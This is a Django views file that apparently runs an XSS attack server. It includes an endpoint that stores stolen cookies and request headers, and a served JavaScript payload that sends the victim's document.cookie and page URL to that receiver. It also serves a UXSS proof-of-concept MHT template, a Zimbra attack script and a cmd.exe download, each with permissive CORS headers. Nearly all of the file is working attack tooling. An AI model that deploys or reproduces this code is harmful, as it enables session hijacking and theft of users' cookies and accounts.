from django.shortcuts import render
# Create your views here.
from django.http import *

from .models import XssReceiver
import os
def getSourceDir():
	BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
	source_dir = os.path.join(BASE_DIR, 'source')
	return source_dir



def receiveData(request):

	cookie = request.GET.get('cookie','meiyou')
	href = request.GET.get('href','meiyou')

	ua = request.META['HTTP_USER_AGENT'] if 'HTTP_USER_AGENT' in request.META else 'meiyou'	#max = (a if a > b else b)
	referer = request.META['HTTP_REFERER'] if 'HTTP_REFERER' in request.META else 'meiyou'
	Origin = request.META['HTTP_ORIGIN'] if 'HTTP_ORIGIN' in request.META else 'meiyou'

	xss_data = XssReceiver(cookie = cookie , ua = ua , referer = referer, href = href, Origin = Origin)
	xss_data.save()
	return HttpResponse('ok')


def xssScript(request):
	xss_js = '''
	function sendCookie(){

			let xml = new XMLHttpRequest;
			xml.open('get','http://127.0.0.1:8000/receive/?cookie='+document.cookie+'&href='+window.location.href);
			xml.send();

		}

	sendCookie();
	'''

	return HttpResponse(xss_js)

def uxss(request):
	src = 'http://www.163.com'
	code = 'alert(document.domain)'
	source_dir = getSourceDir()
	f = open('%s/PoC.mht' % (source_dir),'rb')
	poc = f.read().decode()
	poc = poc.replace("{#src}",src).replace("{#code}",code)
	response = HttpResponse(poc)
	#response['X-Content-Type-Options'] = 'nosniff'
	response['Content-type'] = 'multipart/related'
	response['Access-Control-Allow-Origin'] = '*'
	return response

def zimbra(request):
	f = open('%s/zimbra.js' %(getSourceDir()),'rb')
	code = f.read()
	f.close()
	response = HttpResponse(code)
	response['Access-Control-Allow-Origin'] = '*'
	response['Content-type'] = 'text/javascript'
	return response
	

def test(request):
	f = open("/tmp/cmd.exe","rb")
	code = f.read()
	f.close()
	response = HttpResponse(code)
	response['Access-Control-Allow-Origin'] = '*'
	response['Content-disposition'] = "attachment; filename=cmd.exe"
	return response
# def test(request):
# 	# source_dir = getSourceDir()
# 	# data = open('%s/data.html' % (source_dir),'rb').read()

# 	# mime_type = 'multipart/x-mixed-replace'
# 	# response = HttpResponse(data)
# 	# response['Content-type'] = mime_type
# 	# return response
# 	return HttpResponse('''
# 		<div id='div'>test_page2</div>
# 		<script>
# 		window.document.write(Object.keys(window));
# 		try{
# 			require('fs');
# 			alert(1);
# 		}
# 		catch(e){
# 			alert(e.message);
# 		}
# 		</script>
# 		''')
